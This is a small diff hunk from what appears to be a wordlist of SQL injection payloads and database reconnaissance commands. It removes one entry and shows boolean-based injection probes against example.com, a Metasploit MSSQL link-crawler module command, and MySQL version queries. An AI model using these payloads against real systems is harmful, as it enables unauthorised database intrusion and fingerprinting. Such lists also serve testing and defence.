@@ -766,7 +766,6 @@ http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
 http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
 insert
 like '%'
-limit
 msf> use exploit/windows/mssql/mssql_linkcrawler
 mysql> SELECT @@GLOBAL.VERSION;
 mysql> SELECT @@innodb_version;
